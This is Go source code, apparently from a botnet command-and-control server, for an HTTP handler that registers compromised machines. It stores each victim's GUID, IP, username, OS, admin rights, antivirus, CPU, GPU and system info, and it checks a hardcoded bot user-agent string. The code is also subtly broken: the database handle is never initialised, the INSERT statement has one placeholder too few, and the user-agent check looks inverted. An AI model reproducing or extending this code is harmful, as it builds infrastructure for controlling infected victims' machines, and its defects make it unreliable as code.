package handler

import (
	"fmt"
	"time"
	"log"
	"strings"

	"net/http"
	"database/sql"

	"github.com/bienkma/GhostNetwork/CNCServer/database"
)

// Fix user-agent bot client for Ghost master match.
var userAgent string = "FLDSH3LFDBVSLfdvfdLDYeuglghjgndghioerGH"

// Index page
func IndexHandler(response http.ResponseWriter, request *http.Request) {
	ip := strings.Split(request.RemoteAddr, ":")[0]
	fmt.Fprintf(response, "Index visited by: %s", ip)
}

// IP page
func IPHandler(response http.ResponseWriter, request *http.Request) {
	ip := strings.Split(request.RemoteAddr, ":")[0]
	fmt.Fprintf(response, "ip: %s", ip)
}

// Screen shoot received screen
func New(response http.ResponseWriter, request *http.Request) {
	if request.UserAgent() != userAgent {
		var tmpguid string
		var db *sql.DB
		request.ParseForm()
		var bot = database.Bots{
			GUID:        request.FormValue("0"),
			CLIENTIP:    strings.Split(request.RemoteAddr, ":")[0],
			WHOAMI:      request.FormValue("1"),
			OS:          request.FormValue("2"),
			INSTALL:     request.FormValue("3"),
			ADMIN:       request.FormValue("4"),
			AV:          request.FormValue("5"),
			CPU:         request.FormValue("6"),
			GPU:         request.FormValue("7"),
			VERSION:     request.FormValue("8"),
			SYSINFO:     request.FormValue("9"),
			LASTCHECKIN: time.Now().Format("02 Jan 06 15:04 +0700"),
		}

		err := db.QueryRow("SELECT guid FROM bots WHERE guid=?", bot.GUID).Scan(&tmpguid)
		switch {
		case err == sql.ErrNoRows:
			_, err = db.Exec("INSERT INTO bots(guid, clientip, whoami, os, install, admin, av, cpu, gpu, version, sysinfo, lastcheckin) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
				bot.GUID, bot.CLIENTIP, bot.WHOAMI, bot.OS, bot.INSTALL, bot.ADMIN, bot.AV, bot.CPU, bot.GPU, bot.VERSION, bot.SYSINFO, bot.LASTCHECKIN)
			if err != nil {
				log.Printf("Error write to DB! " + err.Error())
				fmt.Fprintf(response, "Error insert db")
				return
			}
		case err != nil:
			fmt.Fprintf(response, "Error")
		default:
			fmt.Fprintf(response, "exist")
		}
	}
}
